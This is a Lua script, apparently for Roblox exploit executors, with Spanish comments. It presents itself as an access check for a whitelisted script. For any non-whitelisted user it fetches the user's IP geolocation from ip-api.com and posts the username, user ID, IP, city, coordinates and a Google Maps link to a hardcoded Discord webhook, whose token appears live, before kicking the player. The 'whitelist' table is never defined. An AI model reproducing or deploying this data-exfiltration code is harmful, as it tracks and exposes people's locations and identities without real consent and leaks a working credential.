local Webhook = "https://discord.com/api/webhooks/1396332293232263228/yDNk7WXsXLuit9p_TpLe8BCV69TutneEzT3jUBZHsd6dptOzvff_smOLdJQv7GoNq01u" -- Reemplaza con tu Webhook

-- SERVICIOS
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- FUNCI√ìN UNIVERSAL PARA REQUEST
local requestFunc = (syn and syn.request) or (http and http.request) or request

-- FUNCI√ìN PARA OBTENER DATOS IP
local function getIPInfo()
    if not requestFunc then
        warn("‚ùå No se puede obtener IP: tu exploit no tiene funci√≥n 'request'.")
        return {}
    end

    local response = requestFunc({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })

    return HttpService:JSONDecode(response.Body)
end

-- FUNCI√ìN PARA ENVIAR A DISCORD WEBHOOK
local function sendToWebhook(info)
    local embed = {
        ["embeds"] = {{
            ["title"] = "üö® Intento de acceso no autorizado",
            ["color"] = 16711680,
            ["fields"] = {
                { name = "DisplayName", value = LocalPlayer.DisplayName, inline = true },
                { name = "Username", value = LocalPlayer.Name, inline = true },
                { name = "UserID", value = tostring(LocalPlayer.UserId), inline = true },
                { name = "IP", value = info.query or "N/A", inline = true },
                { name = "Country", value = info.country or "N/A", inline = true },
                { name = "Region", value = info.regionName or "N/A", inline = true },
                { name = "City", value = info.city or "N/A", inline = true },
                { name = "Latitude", value = tostring(info.lat or "N/A"), inline = true },
                { name = "Longitude", value = tostring(info.lon or "N/A"), inline = true },
                { name = "Google Maps", value = "[Ver ubicaci√≥n](https://www.google.com/maps/place/"..tostring(info.lat or "")..","..tostring(info.lon or "")..")", inline = false },
                { name = "Motivo", value = "Intento de acceso no autorizado (Hash no en whitelist)", inline = false },
            }
        }}
    }

    requestFunc({
        Url = Webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(embed)
    })
end

-- PROCESO PRINCIPAL
warn("Este script recoge tu IP, ubicaci√≥n y HWID si no est√°s autorizado. Al continuar, aceptas esto.")

if not whitelist[LocalPlayer.UserId] then
    local info = getIPInfo()
    sendToWebhook(info)
    LocalPlayer:Kick("üö´ No est√°s autorizado para usar este script.")
else
    print("‚úÖ Usuario autorizado: " .. LocalPlayer.Name)
end
